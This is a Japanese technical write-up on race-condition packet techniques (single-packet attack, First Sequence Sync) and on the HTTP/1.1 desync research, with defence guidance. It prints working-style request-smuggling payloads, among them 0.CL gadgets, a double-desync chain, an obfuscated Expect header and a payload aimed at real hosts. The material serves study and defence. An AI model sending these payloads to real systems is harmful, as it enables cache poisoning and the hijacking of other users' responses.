> 出典: Web Race Conditions ホワイトペーパー — https://portswigger.net/kb/papers/rifmwla/racewhitepaper.pdf

## (d) single-packet attack 深掘りと限界突破

request smuggling（リクエストスマグリング）を追いかける本章の最後に、James Kettle が 2023 年に発表した **single-packet attack（シングルパケット攻撃）** と、それを 2024 年に日本の GMO Flatt Security（RyotaK 氏）が拡張した **First Sequence Sync（ファーストシーケンスシンク）** を扱う。厳密にはこの二つは「リクエストスマグリング」そのものではなく **race condition（レースコンディション＝競合状態）** を攻撃するための *パケット送信技法* だが、どちらも「フロントエンドとバックエンドの HTTP パーサ・TCP スタック・OS のパケット処理がどう振る舞うか」というスマグリングと地続きの下位レイヤの知識を武器にしており、Kettle 系譜（PortSwigger Research）の到達点として本章の締めくくりにふさわしい。

> 用語の前提：**race condition** とは、サーバが「複数のリクエストを *ほぼ同時* に受け取ったとき、本来なら 1 回しか通らないはずの処理が複数回通ってしまう」たぐいのバグを指す。典型例は「1 回だけ使えるクーポンを同時に 100 回使う」「残高チェックと引き落としの間に割り込んで二重出金する（TOCTOU：Time-Of-Check to Time-Of-Use）」「1 回しか許されない PIN 試行を同時に大量に投げてブルートフォースする」など。狙いどころは、アプリが「チェック」してから「実行（＝ここが sink：入力が最終的に効いてしまう危険な処理点）」するまでの一瞬の隙である。

---

### なぜ「同時に届かせる」ことがこれほど難しいのか

race condition を突くには、複数のリクエストをサーバ内部で **限りなく同時に処理させる** 必要がある。ローカル（同じマシン内）なら簡単だが、リモートのサーバに対しては大きな壁がある。それが **network jitter（ネットワークジッター）** である。

> **network jitter とは**：パケットがネットワークを通る際に生じる、予測できない到達時刻のばらつき。ルータの混雑、経路の違い、再送などにより、「同時に送信した」パケットでもサーバには数ミリ秒〜数十ミリ秒バラついて届く。race condition の窓（隙間）はしばしばマイクロ秒〜ミリ秒未満なので、このジッターだけで攻撃が失敗する。

Kettle 以前の主流だった **last-byte sync（ラストバイト同期）** は、この問題への緩和策だった。仕組みはこうだ。

- 複数のリクエストを、それぞれ **最後の 1 バイトだけ残して** 送っておく。サーバは「リクエストがまだ完結していない」と判断し、処理を保留する（＝ゲートの前で全員を待たせる状態）。
- 攻撃者は最後に、残しておいた「最終バイト」をリクエストの数だけまとめて一気に送る。

しかしこれでも「最終バイト群」は複数の TCP パケットとして飛び、途中でジッターの影響を受ける。結果として **同時に処理させられるのはせいぜい 10 リクエスト程度**、というのが limit-overrun（回数制限突破）系攻撃の実力の上限だった。

---

### single-packet attack の中核アイデア：ジッターを「消す」

James Kettle の発想は単純かつ強力だ。**「複数のリクエストの最終フラグメントを、1 つの TCP パケットの中に詰め込んでしまえば、ネットワークジッターは原理的に存在しなくなる」**。1 つの TCP パケットは分割されずに丸ごと届くので、その中に入っている 20〜30 個のリクエストの「最後の一片」は、サーバに **完全に同時** に届く。到達時刻のばらつきは *ゼロ* になる。

> 原文の要点："This makes *remote* race conditions just as easy to exploit as if they were *local*."（これによりリモートの race condition が、まるでローカルであるかのように簡単に攻撃できるようになる）

#### なぜ HTTP/2 が必須なのか

この技法の鍵は **HTTP/2 の multiplexing（多重化）** にある。

- **HTTP/1.1** では、1 本の TCP コネクション上でリクエストをパイプライン（連続送信）できるが、**レスポンスは受け取った順番でしか返せない**（head-of-line blocking：先頭行ブロッキング）。つまりリクエスト同士がサーバ内部で真に並行処理される保証がなく、直列化されてしまうため race condition を安定して突けない。
- **HTTP/2** では、1 本の TCP コネクション上に複数の **stream（ストリーム）** を張り、それぞれ独立したリクエスト／レスポンスとして **並行処理** できる。1 つの TCP パケットの中に「複数ストリームの最終フラグメント」を interleave（インターリーブ＝交互に詰め込み）できるため、single-packet attack が成立する。

#### 実際の手順

1. HTTP/2 コネクションを 1 本張り、送りたいリクエスト（例：20〜30 個）それぞれについて、本体の大部分を先に送る。ただし **各リクエストの最後の小さな一片（フレーム）を保留** する。
2. これらが物理的にサーバへ到達するのを待つ（＝サーバはすべてのリクエストを「あと少しで完結」の状態で保留している）。
3. 保留していた **全リクエストの最終フラグメントを、まとめて 1 回で送る**。
4. OS（TCP スタック）がこれらの小さなフラグメント群を **1 つの TCP パケットにまとめて（coalesce）** 送出する。
5. サーバはそのパケットを受け取った瞬間、すべてのリクエストが同時に完結し、並行して処理を始める。

> Kettle はこの技法を「last-byte sync（フラグメントを保留して処理を遅らせる）」と、Sergey Bratus らの **timeless timing attack（同一パケット内に詰めることで送信タイミングのばらつきを無効化する）** の 2 つの既存アイデアの合成として説明している。

この方法は **20〜30 リクエストまで容易にスケール** し、しかも「実装が驚くほど簡単」だと述べられている。ツール面では **Burp Suite Repeater の「タブグループを並列に送る（Send group in parallel / single-packet attack）」機能** と、**Turbo Intruder**（PortSwigger 製のオープンソース拡張）が対応している。防御者にとっての実務的含意は「これまで検出できなかった race condition が、HTTP/2 対応インフラ上で誰でも安定して突けるようになった」という点だ。

#### 他プロトコルでの適用可能性（原文の整理）

- **HTTP/3（QUIC/UDP）**：理論上は可能だが、UDP のパケットは約 1,500 バイトが上限で、TCP の実用上限と大差ない。開発コストに見合う利得が小さいと評価されている。
- **HTTP/1.1**：パイプラインで 1 パケットに複数リクエストは載せられるが、前述のレスポンス順序制約（head-of-line blocking）のため真の並行処理ができない。
- **WebSocket**：「レスポンス」という概念がないため並行処理の制約がなく有望。ただしフラグメンテーションの仕様上、複数メッセージを同時に断片化して送れないという別の壁がある（要ツール開発）。

> 出典: The single-packet attack: making remote race conditions local（James Kettle, PortSwigger Research, 2023 年 8 月） — https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local

---

### single-packet attack の「限界」：なぜ 20〜30 リクエストで頭打ちになるのか

ここが本セクションの核心である。single-packet attack が扱えるリクエスト数の上限は、**1 つの TCP パケットに実際に載せられるデータ量** で決まる。ここで多くの人が誤解するので、数字を正しく押さえておく。

- TCP のヘッダ上、1 パケットの理論最大は **65,535 バイト**（TCP のウィンドウ/長さ表現の都合）。
- しかし現実には、イーサネットの **MTU（Maximum Transmission Unit：1 フレームで運べる最大バイト数）＝ 1,500 バイト**（フレーム全体では約 1,518 バイト）という **soft limit（実用上の壁）** に阻まれる。1,500 バイトを超えるデータは複数のフレーム（＝複数パケット相当）に分割されて送られ、ジッターの影響を再び受けてしまう。

つまり「1 つのパケット＝ジッターゼロ」を守ろうとすると、実質 **約 1,500 バイトの中に全リクエストの最終フラグメントを詰め込む** しかない。HTTP/2 の 1 フレームの最小オーバーヘッドを考えると、これが **20〜30 リクエスト** という上限の正体である。

この 20〜30 という数字は、**「同時に 5 回までしか試せない PIN」を破る** といった小規模な race condition には十分だが、**レート制限のかかった OTP/ワンタイムトークンを総当たり** するには **全く足りない**。例えば「6 桁 PIN を数千通り試したい」場合、30 発では話にならない。ここに First Sequence Sync が登場する動機がある。

---

### First Sequence Sync：65,535 バイトの壁を突破する（GMO Flatt Security / RyotaK, 2024）

GMO Flatt Security の RyotaK 氏は 2024 年 8 月の記事で、**1 つの TCP パケットで最大 65,535 バイトを本当に使い切り、10,000 リクエスト規模を同時到達させる** 技法「First Sequence Sync」を発表した。核心は 2 つの下位レイヤ技術の組み合わせである。

#### 材料その1：IP fragmentation で 1,500 バイトの壁を越える

まず「1,500 バイトの壁」を、**TCP のセグメンテーションではなく IP のフラグメンテーション** で越える。

> **IP fragmentation（IP フラグメンテーション）とは**：1,500 バイトを超える IP パケットを、送信側の IP 層が複数のイーサネットフレームに分割して送り、受信側の **IP 層が全フラグメントを再組み立てしてから TCP 層に渡す** 仕組み。ここが決定的で、RyotaK 氏の言葉を借りれば **"fragmented IP packet won't be passed to the TCP layer until all fragments are received"**（フラグメント化された IP パケットは、全フラグメントが揃うまで TCP 層に渡されない）。

これは **TCP segmentation（TCP セグメンテーション）** とは別物である。TCP セグメンテーションはアプリ／TCP 層が独立した複数セグメント（＝別々の到達単位）として扱うのに対し、IP フラグメンテーションは受信側 IP 層で「1 つの大きな TCP パケット」に復元される。したがって攻撃者は、複数フレームに分かれていても **サーバの TCP から見れば単一の巨大パケット（最大 65,535 バイト）** を届けられる。これで物理的なデータ量の壁は消える。

#### 材料その2：TCP のシーケンス番号順序保証を逆手に取る

しかし IP fragmentation だけでは、「巨大パケットが揃った瞬間」を攻撃者が精密に制御できない。そこで **TCP の順序保証** を利用する。

> **TCP sequence number（シーケンス番号）とは**：TCP は各バイトに通し番号を振り、受信側は **番号順に並べ直してからアプリに渡す**。もし途中の番号が欠けていれば、後続のデータが先に届いていても **バッファに溜めたまま、欠けた分が来るのを待つ**（in-order delivery：順序通り配送の保証）。

First Sequence Sync はこの「欠番があると後続を処理できない」性質を **同期のトリガ** として使う。手順は以下の通り。

1. TCP コネクションを確立し、HTTP/2 の各 stream を開く。
2. 各リクエストの本体を「最後の数バイトを残して」送る（従来同様、全リクエストを保留状態にする）。
3. 残りのデータを含む **大きな TCP パケット群を IP フラグメンテーションで送る。ただし「最も若いシーケンス番号（＝先頭）を持つパケット」だけは *送らずに残す***。
4. サーバは先頭シーケンス番号が欠けているため、後から届いた大量のデータ（数千リクエスト分）を **すべてバッファに溜め込んだまま処理を保留** する。
5. 最後に、残しておいた **先頭シーケンス番号のパケットを送る**。
6. 欠番が埋まった瞬間、サーバはバッファ内の全データを一気に順序復元し、**すべてのリクエストを同時に処理する**。

つまり、single-packet attack が「HTTP/2 のフラグメント保留」で同期していたのに対し、First Sequence Sync は **より下位の TCP シーケンス番号で「最後の 1 発（先頭シーケンス）」を同期トリガにする**。データ総量は IP fragmentation で 65,535 バイトまで拡張済みなので、**約 10,000 リクエストを同時に着弾させられる**。

```
（概念図：First Sequence Sync のシーケンス制御）

  TCPシーケンス:   [seq#1]  [seq#2]  [seq#3] ... [seq#N]
                     ↑        │        │          │
                  最後に送る   └─ 先に送って溜めさせる ─┘

  1. seq#2..N を IP fragmentation で先に送る（各々は最大65535B級の巨大パケット）
     → サーバは seq#1 欠番のため全部バッファに保留（アプリに渡さない）
  2. seq#1 を最後に送る
     → 欠番が埋まり、seq#1..N が一気に順序復元 → 全リクエスト同時処理
```

> なぜこの図の通りになるのか：TCP は「順序通りにしかアプリへ渡さない」ため、先頭が欠けている限り後続バイトは *到達済みでもアプリから見えない*。攻撃者はこの「見えない状態」に全リクエストを押し込んでおき、先頭 1 パケットで一斉に可視化する。ネットワークジッターは「先頭パケットの到達時刻の 1 点」にしか影響しないので、同期精度が保たれる。

#### 前提となるサーバ側の制約：SETTINGS_MAX_CONCURRENT_STREAMS

10,000 リクエストを同時に張るには、HTTP/2 の 1 コネクションで開ける **同時ストリーム数** が十分大きくなければならない。これはサーバの `SETTINGS_MAX_CONCURRENT_STREAMS` 設定に依存する（防御・診断の両面で重要な数値）。

| サーバ実装 | SETTINGS_MAX_CONCURRENT_STREAMS（デフォルト） |
|---|---|
| Apache httpd | 100 |
| Nginx | 128 |
| Go（net/http） | 250 |
| nghttp2 / Node.js | 4,294,967,295（実質無制限） |

Apache や Nginx のように 100〜128 に絞られている場合、1 コネクションでの同時リクエスト数はそこで頭打ちになる（複数コネクションに分けると再びジッターの問題が出る）。逆に **nghttp2 / Node.js のように上限が事実上無制限の実装は、単一コネクションで数千〜1 万規模の同時ストリームを許してしまい、First Sequence Sync の効果が最大化される**。サーバ TCP のバッファサイズは現代のシステムでは実用上ほとんど制約にならないとされる。

#### ベンチマーク結果（原文より）

**4,800 マイル（約 250ms のレイテンシ）離れた標的** に対して：

| 指標 | 値 |
|---|---|
| 10,000 リクエスト送信 | 約 166 ミリ秒 |
| 1 リクエストあたり平均 | 16,647 ナノ秒（約 16.6 マイクロ秒） |
| レート制限された PIN の突破 | サーバ側「5 回まで」制限に対し **1,000 回** の試行を実質同時に投入 |

比較として、従来の **last-byte sync では同時試行はせいぜい約 10 発** が上限だった。First Sequence Sync はこれを 2〜3 桁引き上げ、**「5 回制限の OTP を数千通り試す」といった、これまで非現実的だった総当たりを現実の脅威に変えた**。

#### 現時点（2024 年 8 月時点）の実装上の制約

原文が自ら挙げている未対応・限界も、陳腐化対策として明記しておく。

- **HTTPS（TLS）未対応**：この PoC は平文 HTTP/2（h2c 相当）を前提としており、TLS 上での実装は当時未対応。TLS を挟むと暗号化の都合で下位レイヤ制御が難しくなる。
- **送信中の TCP window 更新に未対応**：大量データ送出中に受信側が受信ウィンドウを更新してくるケースを扱えない。
- **Burp Suite / Caido 等のプロキシツール未統合**：この技法は OSI の **レイヤ 3〜4（IP / TCP）** を直接操作するため、レイヤ 7（HTTP）で動く既存の Web プロキシツールにそのまま組み込めない。専用の低レイヤ実装が必要。

> ⚠️ 注意（スコープ）：本セクションは **防御・検知の理解を目的** としている。実在サービスや本番環境に対して無許可でこれらの技法を試すこと、レート制限や OTP 検証を破壊的に総当たりすることは行ってはならない。検証は必ず自分の管理下にある隔離ラボ（意図的に脆弱に構成した検証環境）でのみ行うこと。

> 出典: Beyond the Limit: Expanding single-packet race condition with a first sequence sync for breaking the 65,535 byte limit（RyotaK, GMO Flatt Security Research, 2024 年 8 月 2 日） — https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/

---

### 防御側の視点：何をすれば race condition と single-packet 系攻撃を止められるか

single-packet attack と First Sequence Sync は「攻撃を *安定化・大規模化* する送信技法」であって、根本の脆弱性は **アプリ側の race condition そのもの** にある。パケット技法をいくら塞いでも、下位レイヤの正当な TCP/IP 挙動を止めることはできない（IP fragmentation も TCP の順序保証も正常機能である）。したがって防御は **アプリ層の設計** で行う。

- **原子性の担保**：チェックと更新を単一のアトミック操作にまとめる。DB の悲観ロック（`SELECT ... FOR UPDATE`）、楽観ロック（バージョン列＋条件付き UPDATE）、`UNIQUE` 制約や `INSERT ... ON CONFLICT` などで「二重通過」を DB レベルで不可能にする。「アプリで if 判定してから update」という TOCTOU 構造を排除する。
- **冪等性（idempotency）**：クーポン適用・出金・PIN 検証などに冪等キーを導入し、同一操作が複数回通っても副作用が 1 回分になるようにする。
- **カウンタの原子的デクリメント**：OTP/PIN の残り試行回数は、アプリのメモリではなく **DB や Redis の原子的操作（`DECR` 等）で 1 回の試行ごとに確実に減らす**。「読み取り→判定→書き戻し」を分けると、その隙間に数千の並行リクエストが入り込む。
- **HTTP/2 の同時ストリーム数を絞る**：`SETTINGS_MAX_CONCURRENT_STREAMS` を業務上妥当な小さい値（例：Apache/Nginx のデフォルト水準）に維持し、nghttp2/Node.js のような無制限設定を避ける。これは根治ではないが、single-packet / First Sequence Sync の *規模* を抑える緩和策になる。
- **検知**：短時間に単一 IP・単一コネクションから多数のストリームが「ほぼ同時完結」する挙動、IP フラグメントの異常なパターンは、WAF やネットワーク監視で異常として拾える可能性がある。

要するに、**「同時に届いても壊れない」ようにアプリを設計する** ことが唯一の本質的防御であり、single-packet 系技法の存在は「race condition を *たまに失敗する低確率バグ* と侮ってはならない（今や高確率・大規模に再現される）」という警鐘として受け止めるべきである。

## (e) HTTP/1.1 Must Die: The Desync Endgame（2025）

James Kettle（PortSwigger Research のディレクター）が 2025 年 8 月の Black Hat USA 2025 で発表した研究がこの節の主題である。タイトルの「HTTP/1.1 Must Die（HTTP/1.1 は死ななければならない）」は挑発的だが、主張は技術的にきわめて具体的だ。すなわち、**リバースプロキシ（CDN・ロードバランサ・WAF など、クライアントとオリジンサーバの間に立つ中継サーバ）が上流（upstream, 中継から起点サーバへ向かう内側の接続）で HTTP/1.1 を使い続けるかぎり、リクエストスマグリング（別名 desync 攻撃）は個別パッチでは根絶できない**、という結論である。

本節は防御目的で書く。登場する攻撃手法・ペイロードは、いずれも Kettle らが責任ある開示（responsible disclosure）を経て公表し、すでに修正済みの事例に基づく。実在サービスや本番環境への無許可の検証・破壊的操作を推奨するものではない。読者は自組織の資産に対する正規の権限の範囲で、防御・検知の設計に役立ててほしい。

> 出典: HTTP/1.1 Must Die: The Desync Endgame — https://portswigger.net/research/http1-must-die

### なぜ「HTTP/1.1 は死ぬべき」なのか — 根本原因

リクエストスマグリング（request smuggling）とは、**フロントエンド（中継サーバ）とバックエンド（起点サーバ）が「1 つの HTTP リクエストがどこで終わり、次がどこで始まるか」を食い違って解釈する**ことを悪用する攻撃だ。両者は 1 本の TCP/TLS コネクションを再利用（keep-alive）してリクエストを詰め込んで送るため、境界の解釈がずれると、攻撃者が送ったバイト列の一部が「次に来た別ユーザのリクエストの先頭」として解釈されてしまう。これが「desync（同期のずれ）」である。

HTTP/1.1 の致命的な設計欠陥は、**1 つのリクエストのボディ長（本文の長さ）を指定する方法が複数存在し、しかもテキストベースで曖昧さを許す**点にある。Kettle は 4 つの「長さの決め方」を頭字語で整理した。

- **CL**: `Content-Length` ヘッダで長さを指定する
- **TE**: `Transfer-Encoding: chunked`（チャンク転送。長さを小分けのブロックで示す）で指定する
- **0**: 暗黙のゼロ（implicit-zero。ボディ長の宣言がなく、本文なしとみなす）
- **H2**: HTTP/2 が持つ組み込みの長さフィールド（上流へ HTTP/1.1 へ変換する際に問題化する）

これら複数の方式が並存し、さらに `Expect`・`Connection` といった複雑なヘッダ、HEAD 応答のような暗黙のセマンティクス、そして「古いクライアントを壊したくない」という互換性への恐れが厳格な検証を妨げる。結果として、**フロントエンドとバックエンドで別々の実装が別々の解釈をする「パーサ不一致（parser discrepancy）」が構造的に生じ続ける**。

Kettle の要点は「2019 年（彼の初代 desync 研究の年）から 6 年間、ベンダは個別の緩和策を積み重ねてきたが、それは問題を隠しただけで直してはいない」というものだ。CL.TE のような古典手法は塞がれても、`Expect` ヘッダのような見落とされたエッジケースを突けば、新しい desync クラスがいくらでも生まれる。だからこそ「個別パッチ（endgame ＝ 終盤戦）ではなく、上流 HTTP/1.1 という土台そのものを捨てよ」というのが結論になる。

#### 命名規約: `フロントエンド.バックエンド`

本研究の手法名は `X.Y` の形をとる。**X はフロントエンドがボディ長をどう決めたか、Y はバックエンドがどう決めたか**を表す。

- **CL.0**: フロントエンドは `Content-Length` に従い本文ありと解釈、バックエンドは本文なし（0）と解釈。→ フロントが本文だと思って転送したバイト列を、バックエンドは「次のリクエストの先頭」として読む。
- **0.CL**: フロントエンドは本文なし（0）、バックエンドは `Content-Length` に従い本文ありと解釈。→ バックエンドは来ないはずの本文を待ち、次に届いた別リクエストの先頭を「本文の続き」として飲み込む。
- **CL.TE / TE.CL**: 古典的な、`Content-Length` と `Transfer-Encoding` の優先順位の食い違いを突くもの（多くは既に対策済み）。

Kettle はさらに、パーサ不一致の観測方向として **V-H（Visible-Hidden, 可視-不可視）** と **H-V（Hidden-Visible）** という枠組みを導入した。

- **V-H 不一致**: 細工したヘッダが**フロントエンドには見える（解釈される）が、バックエンドには見えない**。→ CL.0 系の土台。バックエンドから `Content-Length` を隠すことで desync を作る。
- **H-V 不一致**: 逆に、細工したヘッダが**フロントエンドには見えず、バックエンドにだけ見える**。→ フロントがペイロードを別リクエストとしてバッファし、バックエンドが注入済みの本文込みで 1 メッセージとして読む。

この「まずパーサ不一致の**方向**を観測し、それに応じて武器化する」という方法論こそ、この研究の中核である。既製のペイロードを撃つのではなく、**問題の根にあるパースの食い違いそのものをテストする**発想への転換だ。

> 出典: HTTP/1.1 Must Die: The Desync Endgame — https://portswigger.net/research/http1-must-die

### 新クラスその 1: 0.CL desync とデッドロックの打破

`0.CL`（フロントが本文なし、バックエンドが `Content-Length` に従う）は、実は長らく「理論上は存在するが武器化が難しい」とされてきた。理由は**上流デッドロック（upstream deadlock）**にある。

仕組みを追う。フロントエンドは「本文なし」と判断してリクエストをそのまま上流へ転送する。ところがバックエンドは `Content-Length: N` を見て「これから N バイトの本文が来るはずだ」と待ち構える。しかしフロントエンドはもう送るものがない（本文なしと思っている）ので、追加のバイトを送らない。**バックエンドは永遠に本文を待ち、フロントエンドは応答を待つ**——両者が固まってしまい、攻撃が成立しない。

Kettle のブレイクスルーは、**「バックエンドが本文を待たずに先に応答を返してしまう小道具（early-response gadget, 早期応答ガジェット）」を見つける**ことだった。バックエンドが本文の到着前に応答を吐けば、デッドロックが破れ、後続バイトが次リクエストの先頭として解釈される余地が生まれる。代表的なガジェット:

- **Windows の予約ファイル名**: `/con`, `/nul`, `/aux` などは Windows のデバイス名であり、これを要求すると IIS（Windows 上の Web サーバ）が OS 例外的に**本文を読み切る前に即座に応答**することがある。
- **サーバリダイレクト**: 特定パスへのアクセスが 301/302 を即返す場合、本文を待たずに応答が返る。

```
GET /con HTTP/1.1
Host: <target>
Content-Length: 7

GET / HTTP/1.1
Host: <target>
```

**なぜ desync になるのか**: フロントエンドは `GET /con ...` を本文なしと判断して転送する。バックエンド（IIS）は `/con`（予約名）に対し本文（7 バイト）を待たずに即応答する。すると本来「本文」であるはずの `GET / HTTP/1.1...` の各バイトが宙に浮き、コネクション上に残る。次にこのコネクションが再利用されると、その残骸が次リクエストの先頭に連結され、境界がずれる。上の例では最終的にバックエンドが不正な連結を 400 として返す、といった観測可能な兆候が出る。

> 出典: HTTP/1.1 Must Die: The Desync Endgame — https://portswigger.net/research/http1-must-die

### 新クラスその 2: ダブルデシンク（Double-Desync）による武器化

0.CL でデッドロックを破れても、それ単体では「注入した悪性プレフィックス（malicious prefix, 被害者リクエストの前に差し込む攻撃者制御のバイト列）」を確実に被害者へ当てるのが難しい場合がある。そこで Kettle は **2 段構えのダブルデシンク**を編み出した。

考え方は「**1 発目の 0.CL でコネクションを汚染し、それを 2 発目で CL.0 のトラップに変換する**」というもの。CL.0 状態を作れれば、以後そのコネクションを使う被害者のリクエストの前に、攻撃者の任意プレフィックスが差し込まれる。

```
POST /nul HTTP/1.1
Content-Length: 92

GET /z HTTP/1.1
Content-Length: 180
Foo: GET /y HTTP/1.1
????: ????
POST /index.asp HTTP/1.1
Content-Length: 201
<param>=<payload>
```

**なぜこう組むのか**: 1 発目（`POST /nul ...`）は 0.CL ガジェット（予約名 `nul`）で早期応答を誘発し、ヘッダの途中でリクエストを「切断」する。その切れ端が 2 発目のリクエストと連結され、2 発目の `Content-Length` が「これから来る被害者リクエストを丸ごと本文として飲み込む」CL.0 の罠を張る。以後、被害者が同じコネクションに乗せたリクエストは攻撃者が指定した `POST /index.asp ...` などのプレフィックスに巻き込まれ、任意リクエストのすり替え（リクエストスマグリング／ヘッダ注入）が成立する。この手法は IIS や AWS ALB（Application Load Balancer）を挟む構成で確認された。

### 新クラスその 3: Expect ヘッダによる desync

この研究でもっとも実り多い攻撃面が `Expect` ヘッダである。`Expect: 100-continue` は本来、「大きな本文を送る前に、サーバが受け入れ可能か（100 Continue を返すか）確認する」ための機能で、**リクエストを 2 フェーズ（ヘッダ送信 → 100 応答 → 本文送信）に分割**する。この分割の扱いがサーバ実装ごとにバラバラなため、新しい desync の温床になる。

#### バニラ Expect による 0.CL

`Expect: 100-continue` を素直に（バニラ, obfuscation なしで）付けるだけで desync するサーバがある。**100 以外の応答（例: リダイレクトやエラー）を返したあと、本文を待ち続けるのを「忘れる」実装**が該当する。以下は T-Mobile で確認され、開示・修正された 0.CL 事例の形である。

```
GET /logout HTTP/1.1
Host: <redacted>.t-mobile.com
Expect: 100-continue
Content-Length: 291

GET /logout HTTP/1.1
Host: <target>
Content-Length: 100
GET / HTTP/1.1
Host: <target>
GET https://psres.net/assets HTTP/1.1
X: y
```

**なぜ desync するのか**: フロントエンドは `Expect: 100-continue` を受け、100 応答フローを回したのち「本文はもう不要」と判断してリクエストを転送する（＝本文長 0 扱い）。一方バックエンドは `Content-Length: 291` を見て 291 バイトの本文到着を待つ。フロントが送らないため、バックエンドは**次に届いた別リクエストの先頭 291 バイトを「本文」として飲み込む**。結果、埋め込んだ `GET /logout ...` 以降が被害者のリクエスト境界を破壊し、任意リクエスト注入が成立する。

#### 難読化（obfuscated）Expect による WAF 回避

WAF が `Expect: 100-continue` を正規表現で検知・除去しようとしても、値をわずかに崩すだけで検知を外しつつサーバには有効に解釈させられる。

```
Expect: y 100-continue
```

先頭にダミー（`y `）を差し込む、タブ文字を混ぜる、ヘッダ折りたたみ（CRLF + 空白による行継続）を使う、などのバリエーションで、**正規表現ベースの検知は外れるが、寛容なパーサは依然 100-continue セマンティクスを発火させる**。これが「regex ベースの WAF は根本的な parser 欠陥に無力」という主張の実証である。

#### CL.0 via Expect — Akamai / CVE-2025-32094

この研究で開示された最重要事例が **CVE-2025-32094**（Akamai CDN）である。難読化 Expect を使った **CL.0** で、Akamai のインフラ層（個々の顧客コードではなく CDN 自体）に脆弱性があった。

```
OPTIONS /anything HTTP/1.1
Host: auth.lastpass.com
Expect: 100-continue
Content-Length: 39

GET / HTTP/1.1
Host: www.sky.com
X: X
```

**何が起きるか**: フロントエンド（Akamai）は Expect 処理の副作用で本文を「消費し切らない／解釈がずれる」状態になり、`Content-Length` 分のバイト（`GET / HTTP/1.1 / Host: www.sky.com ...`）が**別リクエストとしてバックエンド側に注入**される。結果として、`auth.lastpass.com`（LastPass の認証ドメイン）にアクセスしたユーザに、まったく無関係な `www.sky.com` のコンテンツが配信され得る——応答キュー汚染（Response Queue Poisoning, RQP。応答の並び順をずらして他ユーザ向けの応答を横取り／すり替えする攻撃）による、任意コンテンツ注入・認証妨害である。

この Akamai の欠陥は、ホットフィックス提供から完全解消まで **65 日**を要した。バグバウンティは研究者本人に $9,000、同一手法を用いたコミュニティ全体では **74 件の報告で総額 $221,000** が支払われた。Akamai・CloudFront・Fastly・nginx は当時 upstream HTTP/2 に未対応であり、この構造的な H2→H1.1 ダウングレードが被害を広げた。

その他の開示事例:

- **Netlify（CL.0 via バニラ Expect）**: 難読化なしの素の Expect で desync。
- **GitLab（0.CL via 難読化 Expect）**: タブ文字などのヘッダ操作を要した。
- **Cloudflare（キャッシュ汚染）**: 1 件の脆弱性で **2,400 万（24M）サイト**を制御下に置けるキャッシュ汚染が成立した（悪性 JavaScript の永続的キャッシュ汚染 → 持続的な乗っ取り）。

> ⚠️ **未取得の資料**: 「Black Hat USA 2025 ホワイトペーパー PDF（US-25-Kettle-HTTP1-Must-Die-The-Desync-Endgame-wp.pdf）」は本文の全文を確実に構造化抽出できませんでした（理由: PDF のバイナリは取得できたものの、自動要約は一部の攻撃クラス名を TE 系と混同する誤りを含みました）。正確な逐語ペイロードと図は以下からご自身で直接ご覧ください: https://i.blackhat.com/BH-USA-25/Presentations/US-25-Kettle-HTTP1-Must-Die-The-Desync-Endgame-wp.pdf
>
> （以下は未取得資料の補足として一般知識に基づく解説です）ホワイトペーパーは本節で扱った 0.CL・CL.0・Expect 系・ダブルデシンクの各クラスについて、確認済みのエクスプロイトパス（confirmed exploit path）と実ペイロードを、ライブターゲットでの探索方法論とともに詳述している。上記 PortSwigger 研究記事（portswigger.net/research/http1-must-die）が同内容の要約に相当するため、逐語の正確さが必要な場面以外は記事側で要点を追える。

> 出典: HTTP/1.1 Must Die: The Desync Endgame — https://portswigger.net/research/http1-must-die

### 検出方法論 — HTTP Request Smuggler v3.0

Kettle はこの研究に合わせ、Burp Suite 拡張 **HTTP Request Smuggler を v3.0 に全面刷新**し、オープンソース公開した。加えて低レイヤのパーサ挙動を可視化する **HTTP Hacker** ツールも提供している。

v3.0 の核心は「既製ペイロードを撃つ」のではなく **「プリミティブ・レベルの desync プローブ（primitive-level probes）」でパーサ不一致そのものを炙り出す**発想である。

- **戦略**: `Host`・`User-Agent` などのヘッダに対し、先頭スペース・重複・不正値・タブ・行折りたたみといった摂動（permutation）を系統的に注入し、**差分応答（differential response）** を観測する。
- **判定カテゴリ**:
  1. **V-H 不一致**: 難読化ヘッダで固有の応答、クリーンなヘッダで標準応答 → フロント可視・バック不可視。
  2. **H-V 不一致**: 上記の逆パターン。
  3. **高リスクなパース**: RFC が要求する `\r\n\r\n`（CRLF 2 回）ではなく `\n\n`（LF のみ）でヘッダ終端を受け入れてしまうサーバなど、RFC 逸脱の兆候。

検出は主に**タイミング解析**と**ステータスコードの異常**（バックエンドの混乱を示す `400 Bad Request` など、予期せぬ早期／遅延応答）を手掛かりにする。「以前テストして安全と判断した対象を、新プローブで再検査せよ」というのが実務上の最重要アドバイスだ。安全とされたサイトに未検出の desync が潜んでいる可能性が高い。

> 出典: HTTP/1.1 Must Die: what this means for bug bounty hunters — https://portswigger.net/blog/http-1-1-must-die-what-this-means-for-bug-bounty-hunters

### 攻撃の前提条件と影響クラス（防御者向け整理）

**成立条件（この 5 つが揃うと危険）**:

1. リクエストを共有バックエンドに集約する**リバースプロキシ**が存在する。
2. プロキシとオリジン（または多段中継）の間に**パーサ不一致**がある。
3. **コネクション再利用（keep-alive）がユーザ間で共有**される。
4. 0.CL の場合は**早期応答ガジェット**（予約名・リダイレクト・Expect 処理）が存在する。
5. 汚染を持続／リアルタイム化する**キャッシュ or 応答キュー**がある。

**影響クラス**:

- **リクエストスマグリング／ヘッダ注入**: 被害者リクエストに悪性 HTTP を差し込む。
- **キャッシュ汚染**: 悪性 JavaScript の持続的注入（永続 XSS・不正リダイレクト）。
- **応答キュー汚染（RQP）**: 他ユーザ宛ての応答をリアルタイムに横取り／すり替え（ランダムに他人のアカウントへログインさせられる、等）。
- **サイト完全乗っ取り**: 認証迂回・資格情報窃取。**HTTPS 暗号化はこの攻撃を一切防がない**（暗号化されていても、復号後の中継層で境界がずれるため）。
- **CDN 規模の一括侵害**: 1 件で数千万サイトに波及。

### 防御 — 上流 HTTP/2 への移行が本命

キャンペーンサイト http1mustdie.com と研究記事が示す防御の優先順位は明確だ。

#### 1. 本命: 上流を HTTP/2 にする

> 「HTTP/2 は TCP や TLS と同じくバイナリプロトコルであり、メッセージ長に関する曖昧さがゼロである。」

HTTP/2 はフレーム長をバイナリで一意に持つため、テキストパースの食い違いという攻撃面が**原理的に消滅**する。フロントエンドからオリジンへの上流接続を HTTP/2 に切り替えれば、desync 脅威は根絶される。

- **上流 HTTP/2 対応済み**: HAProxy, F5 Big-IP, Google Cloud, Imperva。
